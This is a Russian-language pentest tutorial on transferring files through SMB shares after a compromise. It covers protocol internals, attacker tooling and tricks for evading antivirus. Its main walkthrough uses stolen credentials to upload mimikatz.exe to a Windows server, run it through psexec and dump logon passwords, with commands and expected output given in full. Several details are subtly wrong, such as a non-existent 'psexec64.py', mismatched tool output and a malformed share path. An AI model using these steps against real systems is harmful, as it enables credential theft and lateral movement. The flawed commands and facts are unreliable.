# Передача файлов через SMB-шару в контексте пост-эксплуатации

## Контекст и базовые понятия

Протокол Server Message Block (SMB), также известный в ранних реализациях как Common Internet File System (CIFS), является фундаментальным сетевым протоколом для обмена файлами, принтами и межпроцессного взаимодействия в гетерогенных сетях. В контексте тестирования на проникновение и пост-эксплуатации SMB представляет собой не просто механизм хранения данных, а критически важную поверхность атаки и канал для логистики вредоносного ПО. Понимание архитектуры SMB необходимо для разграничения понятий «монтирование файловой системы» (клиентская операция чтения/записи) и «эксплуатация уязвимостей протокола» (атаки на уровень транзакций или аутентификации).

С технической точки зрения, SMB работает поверх TCP/IP (порты 139 и 445) или напрямую через NetBIOS over TCP/IP (NBT). В современных сетях (Windows Server 2008 R2 и новее, Windows 7 и новее) NetBIOS-слой отключен по умолчанию, и SMB напрямую инкапсулируется в TCP-сегменты. Это изменение архитектуры устранило многие векторы атак, связанные с уязвимостями NetBIOS, но оставило SMB-транзакции уязвимыми к атакам типа «человек посередине» (MitM) при отсутствии обязательной подписи (SMB Signing).

Ключевое разграничение в теме «Передача файлов» заключается в различии между легитимным администрированием и злонамеренной логистикой. Администратор использует SMB для развертывания патчей, резервного копирования и управления конфигурациями. Атакующий использует те же механизмы для:
1.  **Загрузки инструментов пост-эксплуатации** (Meterpreter, Mimikatz, GPP-decrypt, скрипты для горизонтального перемещения) на скомпрометированный хост, если прямой доступ в интернет отсутствует (air-gapped или сегментированная сеть).
2.  **Выгрузки чувствительных данных** (дамп памяти, базы данных, документы) из периметра.
3.  **Посадки «приманок»** (например, SCF-файлов) для кражи хешей NTLM от легитимных пользователей, просматривающих шару.

Путаница часто возникает между понятиями **SMB Share** (логическая папка, экспортированная сервером) и **SMB Session** (установленное соединение с контекстом безопасности). Передача файлов происходит на уровне сессии, но управление доступом определяется на уровне шары. Важно различать также **Anonymous Access** (доступ без аутентификации, часто разрешен для шары `IPC$` или публичных папок) и **Authenticated Access** (требующий валидных учетных данных). В пост-эксплуатации атакующий часто имеет ограниченные права (например, `Users`), что накладывает ограничения на то, куда можно записать файл (только в директории с правами `Write` или `Full Control`).

Для наглядного разграничения сущностей, используемых в процессе передачи файлов, приведена ниже сравнительная таблица.

| Сущность | Уровень OSI / Стек | Функция в контексте передачи файлов | Индикаторы в трафике/системе |
| :--- | :--- | :--- | :--- |
| **SMB Share** | Прикладной (SMB Direct) | Логическая точка монтирования, определяющая корневую директорию доступа. Не является файлом, а является контейнером. | Вывод `smbclient -L`: `SHARE_NAME`, `Type`, `Comment`. В реестре: `HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Shares`. |
| **SMB Session** | Прикладной (SMB Transact) | Контекст безопасности, связывающий клиентский процесс с учетной записью на сервере. Определяет права на чтение/запись. | Токены доступа (Access Tokens). В логах Windows: Event ID 4624 (Logon) с Logon Type 3 (Network). |
| **SMB File Handle** | Прикладной (SMB Transact) | Указатель на открытый файл внутри сессии. Позволяет выполнять операции `Read`, `Write`, `Close`. | В дампе памяти процесса `lsass.exe` или `svchost.exe` (Service: LanmanServer). В Wireshark: пакеты с кодами команд `SMB2_WRITE` или `SMB2_READ`. |
| **CIFS** | Прикладной (Legacy) | Устаревшее название протола, используемое в старых клиентах (Windows 9x/NT4). Поддерживает только SMB1. Уязвим к EternalBlue. | Заголовки протокола с версией `SMB1`. Порт 139 (NetBIOS Session Service). |
| **SMB2/SMB3** | Прикладной (Modern) | Современная реализация. Поддерживает мульти-канал (Multi-channel), шифрование (SMB3 Encryption), подписывание. | Заголовки с версией `SMB2_02`, `SMB2_10`, `SMB3_00`, `SMB3_11`. Порт 445. |

Важно отметить, что передача файлов через SMB в пост-эксплуатации часто сталкивается с проблемой **MTU (Maximum Transmission Unit)**. Стандартный MTU в Ethernet составляет 1500 байт. SMB-пакеты могут фрагментироваться, что увеличивает заголовочные накладные расходы и риск обнаружения по аномалиям фрагментации. Для обхода некоторых IDS/IPS систем атакующие могут использовать фрагментацию SMB-пакетов или инкапсулировать трафик SMB в другие протоколы (например, HTTP через SMB-over-HTTP, хотя это требует специфической конфигурации сервера).

## Внутреннее устройство протокола SMB и механизмы передачи

Для понимания того, как именно файлы передаются через шару, необходимо рассмотреть внутреннюю структуру протокола SMB, особенно версии 2.1 и 3.x, которые являются стандартом де-факто. Протокол построен на модели «запрос-ответ» (request-response) и использует концепцию транзакций. Каждая операция с файлом (открытие, чтение, запись, закрытие) представляет собой отдельную транзакцию, идентифицируемую `Tree ID` (для шары) и `Message ID` (для пакета).

### Архитектура пакета SMB2/SMB3

В отличие от SMB1, где команды были жестко закодированы в фиксированных полях, SMB2 использует гибкую структуру команд. Базовый заголовок SMB2 содержит:
1.  **Protocol Header:** Магическое число `0xFE534D42` (SMB\).
2.  **Structure Size:** Размер заголовка (обычно 64 байта).
3.  **Command:** Код операции (например, `0x03` для `SMB2_READ`, `0x05` для `SMB2_WRITE`, `0x00` для `SMB2_CREATE`).
4.  **Credit Charge:** Количество кредитов, запрашиваемых у получателя (механизм управления потоком).
5.  **Status:** Код состояния выполнения.
6.  **Flags:** Флаги (например, `0x08` — запрос подписи, `0x20` — ответ).
7.  **Next Command:** Смещение следующей команды в теле, если пакет содержит несколько транзакций (pipelining).
8.  **Message ID:** Уникальный идентификатор сообщения для сопоставления запроса и ответа.
9.  **Process ID / Tree ID / Session ID:** Идентификаторы процесса, дерева (шары) и сессии.

Тело пакета (Payload) зависит от команды. Для передачи файла критически важны команды `SMB2_CREATE` (открытие файла) и `SMB2_WRITE` (запись данных).

### Процесс записи файла (Write Operation)

Передача файла на скомпрометированный хост через SMB-шару состоит из следующих внутренних этапов:
1.  **Negotiation:** Клиент и сервер согласовывают версию протокола (SMB2.1 или SMB3.1.1).
2.  **Session Setup:** Аутентификация. Если используется NTLM, происходит обмен `NEGOTIATE`, `CHALLENGE`, `AUTHENTICATE`. Если используется Kerberos, — TGT.
3.  **Tree Connect:** Клиент подключается к конкретной шаре (`\\server\share`). Сервер проверяет права пользователя на эту шару.
4.  **Create:** Клиент открывает файл на сервере. Если файл не существует, он создается (если есть права). Сервер возвращает `File ID` (FID), который используется для всех последующих операций с этим файлом.
5.  **Write:** Клиент отправляет пакеты `SMB2_WRITE` с фрагментами данных. Каждый пакет содержит:
    *   `File ID`: идентификатор открытого файла.
    *   `Offset`: смещение в файле, куда записываются данные.
    *   `Data Offset`: смещение данных внутри пакета.
    *   `Data Length`: длина передаваемых данных.
    *   `Remaining`: количество байт, оставшихся для передачи в этом пакете (если пакет не содержит все данные).
6.  **Close:** Закрытие дескриптора файла.

Важной особенностью SMB3 является **SMB Multichannel**. Клиент может установить несколько TCP-соединений к одному серверу и агрегировать их пропускную способность. Это используется для ускорения передачи больших файлов, но также может быть использовано атакующими для обхода ограничений на одно соединение или для создания устойчивого канала.

### Структура данных при передаче

Ниже представлена иллюстративная структура пакета `SMB2_WRITE` в формате, близком к реальному дампу трафика.

```json
{
  "smb2_header": {
    "protocol_id": "0xFE534D42",
    "command": "SMB2_WRITE (0x05)",
    "credit_charge": 1,
    "status": "0x00000000 (SUCCESS)",
    "flags": "0x08 (Signed)",
    "message_id": "<уникальный ID запроса>",
    "tree_id": "<ID шары, например, 1>",
    "session_id": "<ID сессии, например, 12345>"
  },
  "write_payload": {
    "file_id": {
      "persistent": "<8 байт, идентификатор файла на сервере>",
      "volatile": "<8 байт, идентификатор файла в сессии>"
    },
    "offset": "<64-битное смещение в файле, куда записываются данные>",
    "remaining_bytes": "<количество байт в этом пакете>",
    "data_offset": "<смещение данных относительно начала пакета>",
    "data_length": "<длина полезной нагрузки>",
    "data": "<фрагмент содержимого файла (hex/raw)>",
    "channel": "<индекс канала в мультиканальном режиме>"
  }
}
```

### Подпись и шифрование

В современных сетях по умолчанию включена **SMB Signing** (подпись пакета). Это гарантирует целостность и аутентичность данных. Если подпись отключена (например, из-за уязвимости или неправильной конфигурации GPO), атакующий может модифицировать пакеты `SMB2_WRITE` на лету, внедряя вредоносный код в легитимный файл или заменяя файл целиком.

**SMB Encryption** (начиная с SMB3.0) шифрует тело пакета. Это делает перехват и модификацию данных невозможными без ключа сессии. Однако в пост-эксплуатации атакующий часто имеет доступ к ключам сессии (через дамп LSASS или Kerberos tickets), что позволяет ему расшифровывать трафик или генерировать легитимные пакеты с шифрованием.

## Применение и работа с предметом

На практике передача файлов через SMB-шару в рамках тестирования на проникновение реализуется с использованием специализированных утилит, которые абстрагируют сложность протокола SMB. Выбор инструмента зависит от операционной системы атакующего, наличия учетных данных и требуемой скорости.

### Инструментарий и методы

1.  **smbclient (Samba):**
    *   *Назначение:* Клиент для Linux/Unix. Позволяет монтировать шары, загружать и выгружать файлы.
    *   *Применение:* Используется для загрузки инструментов (например, `mimikatz.exe`) на Windows-хост из Linux-машины атакующего.
    *   *Особенности:* Поддерживает аутентификацию NTLM, Kerberos. Может работать в режиме `non-interactive` для скриптов.

2.  **psexec / smbexec / wmiexec (Impacket):**
    *   *Назначение:* Удаленное выполнение команд и загрузка файлов через SMB.
    *   *Применение:* Загрузка файла на временную шару (например, `ADMIN$` или `C$`) с последующим выполнением через `cmd.exe` или `powershell.exe`.
    *   *Особенности:* `smbexec` и `wmiexec` не требуют установки служб (как `psexec`), что делает их менее заметными в логах.

3.  **Mount.cifs (Linux) / Net Use (Windows):**
    *   *Назначение:* Монтирование удаленной шары как локальной файловой системы.
    *   *Применение:* Прямая работа с файлами как с локальными. Удобно для массового копирования.
    *   *Особенности:* Требует прав `root` (Linux) или администратора (Windows) для монтирования.

4.  **SMBRelay / SMBGhost (Exploitation):**
    *   *Назначение:* Эксплуатация уязвимостей для обхода аутентификации или выполнения кода.
    *   *Применение:* Если SMB Signing отключен, можно использовать `ntlmrelayx` для ретрансляции аутентификации и загрузки файлов на другие хосты без знания пароля.

### Типовые операции пост-эксплуатации

#### 1. Загрузка файла (Upload)
Атакующий, имеющий права на запись в шару, использует команду `put` или `smbput`.
*   *Шаг 1:* Подключение к шаре.
*   *Шаг 2:* Загрузка файла.
*   *Шаг 3:* Проверка целостности (опционально).

#### 2. Выгрузка файла (Download)
Атакующий выгружает дампы паролей, логи или документы.
*   *Шаг 1:* Подключение к шаре.
*   *Шаг 2:* Загрузка файла на локальную машину.
*   *Шаг 3:* Удаление следов (опционально).

#### 3. Монтирование для работы
Иногда требуется не просто передать файл, а работать с ним удаленно.
*   *Linux:* `mount -t cifs //IP/SHARE /mnt -o username=user,password=pass`
*   *Windows:* `net use Z: \\IP\SHARE /user:user pass`

### Типичные ошибки и подводные камни

1.  **Ограничения размера файла:** Некоторые старые реализации SMB1 имеют ограничения на размер файла (2 ГБ). SMB2/3 поддерживают файлы до 16 ЭБ, но клиентские библиотеки могут иметь свои ограничения.
2.  **Имена файлов:** Windows не разрешает определенные символы в именах файлов (`< > : " / \ | ? *`). При передаче файлов из Linux на Windows необходимо экранировать или заменять эти символы.
3.  **Права доступа:** Даже при наличии учетных данных, если шара имеет права `Read Only`, запись будет невозможна. Необходимо проверять права через `smbclient -L` или `enum4linux`.
4.  **Антивирусы и EDR:** Загрузка исполняемых файлов (`.exe`, `.dll`) через SMB часто детектируется антивирусами как подозрительная активность. Атакующие используют обфускацию имен файлов (например, `image.exe` -> `image.dll` или `image.sys`) или инкапсуляцию в архивы (`.zip`, `.cab`).
5.  **Скорость передачи:** SMB может быть медленным из-за накладных расходов на протокол. Для больших файлов рекомендуется использовать `rsync` поверх SSH или `scp`, если доступна альтернативная сеть.

### Пример команды загрузки файла через smbclient

```bash
# Подключение к шаре и загрузка файла
smbclient //192.168.1.100/secret_share -U pentester%password123 -c "put /tmp/mimikatz.exe mimikatz.exe"

# Разбор команды:
# //192.168.1.100/secret_share - адрес сервера и имя шары
# -U pentester%password123 - учетные данные (username%password)
# -c "..." - команда для выполнения в интерактивной оболочке smbclient
# put /tmp/mimikatz.exe - локальный файл
# mimikatz.exe - имя файла на удаленной шаре
```

## Сквозной практический пример: Загрузка и выполнение инструмента на скомпрометированном хосте

**Исходные условия:**
*   **Атакующий:** Linux-машина (Kali Linux) с IP `192.168.1.50`.
*   **Жертва:** Windows Server 2019 с IP `192.168.1.100`.
*   **Доступ:** Атакующий имеет учетные данные легитимного пользователя `jsmith` с паролем `Summer2024!`, который имеет права на запись в шару `\\192.168.1.100\IT_Support`.
*   **Цель:** Загрузить инструмент `mimikatz.exe` на сервер и выполнить его для выгрузки хешей паролей.
*   **Инструменты:** `smbclient`, `psexec64.exe` (для выполнения), `mimikatz.exe`.

### Шаг 1: Проверка доступа к шаре

Перед передачей файлов необходимо убедиться, что шара доступна и права корректны.

```bash
# Проверка списка шар и прав
smbclient -L //192.168.1.100 -U jsmith%Summer2024!

# Ожидаемый вывод:
# Sharename       Type      Comment
# ---------       ----      -------
# ADMIN$          Disk      Remote Admin
# C$              Disk      Default share
# IT_Support      Disk      IT Support Files
# IPC$            IPC       Remote IPC
# ...
# Domain: WORKGROUP
# OS: Windows Server 2019 Datacenter 17763
# Server: Windows Server 2019 Datacenter 6.3
```

### Шаг 2: Загрузка файла на шару

Используем `smbclient` для загрузки `mimikatz.exe` в директорию `IT_Support`.

```bash
# Загрузка файла
smbclient //192.168.1.100/IT_Support -U jsmith%Summer2024! -c "put /usr/share/windows-resources/mimikatz/x64/mimikatz.exe mimikatz.exe"

# Ожидаемый вывод:
# put '/usr/share/windows-resources/mimikatz/x64/mimikatz.exe': NT_STATUS_OK
```

### Шаг 3: Проверка наличия файла

Убедимся, что файл успешно записан.

```bash
# Проверка содержимого шары
smbclient //192.168.1.100/IT_Support -U jsmith%Summer2024! -c "ls mimikatz.exe"

# Ожидаемый вывод:
# .                                   D        0  Wed Oct 10 10:00:00 2023
# ..                                  D        0  Wed Oct 10 09:55:00 2023
# mimikatz.exe                        A   256000  Wed Oct 10 10:00:00 2023
```

### Шаг 4: Выполнение файла через PsExec

Используем `psexec64.exe` из Impacket для запуска `mimikatz.exe` на удаленном сервере.

```bash
# Запуск удаленного процесса
psexec64.py jsmith:Summer2024!@192.168.1.100 -share IT_Support -command 'cmd.exe /c "C$\IT_Support\mimikatz.exe"'

# Ожидаемый вывод (фрагмент):
# [!] Press help for extra shell commands
# PsExec service started on 192.168.1.100...
# Connecting to SMB1 share...
# Connecting to ADMIN$ share...
# Creating service QZx...
# Starting service QZx...
# Removing service QZx...
# [10/10/2023 10:01:00] Command output:
#   .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2022 17:16:13
#  .## ^ ##.  "A La Vie, A L'Amour"
#  ## / \ ##  /* * *
#  ## \ / ##  # Benjamin DELPY `gentilkiwi`
#  '## v ##'   http://blog.gentilkiwi.com/mimikatz
#   '#####'    (c) 2010-2022
#  ##########  #
#  ...
#  mimikatz(powershell) # sekurlsa::logonpasswords
#  ...
```

### Ожидаемый вывод

В результате выполнения примера атакующий получает доступ к хешам паролей пользователей, вошедших в систему. Файл `mimikatz.exe` был успешно передан через SMB-шару и выполнен на удаленном хосте. Это демонстрирует типичный вектор атаки: использование легитимных учетных данных для доступа к SMB-шаре и последующей загрузки и выполнения вредоносного инструмента.

## Аналитический вывод

Передача файлов через SMB-шару является одним из наиболее распространенных и эффективных методов логистики в пост-эксплуатации. Протокол SMB, будучи стандартом де-факто для обмена файлами в корпоративных сетях, предоставляет атакующим легитимный канал для обхода периметровых средств защиты. Ключевыми факторами успеха атаки являются наличие учетных данных с правами на запись и отсутствие строгих политик контроля исполнения (AppLocker, WDAC) или антивирусной защиты на целевом хосте.

С технической точки зрения, понимание внутренней структуры SMB2/SMB3 позволяет атакующим оптимизировать передачу данных, использовать мультиканальность для ускорения и обходить некоторые механизмы детекции. Однако, современные реализации SMB включают обязательную подпись (SMB Signing) и шифрование (SMB Encryption), что усложняет атаки типа MitM и требует от атакующего наличия валидных учетных данных или возможности обхода аутентификации (например, через ретрансляцию NTLM).

Для защиты от подобных атак необходимо применять принцип наименьших привилегий, ограничивать доступ к SMB-шарам, включать обязательную подпись SMB и шифрование, а также мониторить аномальную активность в логах SMB (например, необычные времена подключения, массовую выгрузку файлов, использование подозрительных инструментов).
